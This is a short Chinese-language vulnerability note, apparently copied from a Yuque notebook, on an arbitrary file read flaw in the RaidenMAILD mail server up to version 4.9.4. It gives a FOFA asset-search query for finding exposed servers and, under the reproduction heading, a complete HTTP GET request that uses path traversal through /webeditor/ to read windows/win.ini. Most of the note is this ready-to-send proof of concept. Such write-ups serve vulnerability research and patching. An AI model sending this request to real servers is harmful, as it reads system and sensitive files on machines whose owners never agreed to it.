# RaidenMAILD邮件服务器v.4.9.4存在任意文件读取漏洞

# 一、漏洞简介
<font style="color:rgb(51, 51, 51);"> </font>RaidenMAILD是一款稳定、安全、高性能的邮件服务器软件，适用于中小型企业、机构以及个人用户搭建自己的邮件系统。该产品 Raden MAILD Mail Server v.4.9.4及以前版本中存在任意文件读取漏洞，允许远程攻击者通过/webeditor/组件获取敏感信息。

# 二、影响版本
+ RaidenMAILD<4.9.4

# 三、资产测绘
+ fofa`RaidenMAILD Mail Server <= 4.9.4`
+ 特征

![1714229722832-98ad3c87-4222-411f-87e2-5895a002cdd9.png](./img/cToKgwcRMUfI6HSw/1714229722832-98ad3c87-4222-411f-87e2-5895a002cdd9-041666.png)

# 四、漏洞复现
```plain
GET /webeditor/../../../windows/win.ini HTTP/1.1
Host: 
Cache-Control: max-age=0
Connection: close
```

![1714229752407-c112d773-a048-4c35-afd1-0c96c3a4f6fe.png](./img/cToKgwcRMUfI6HSw/1714229752407-c112d773-a048-4c35-afd1-0c96c3a4f6fe-619548.png)



> 更新: 2024-04-28 16:17:13  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gyn1em2xgen6fhmc>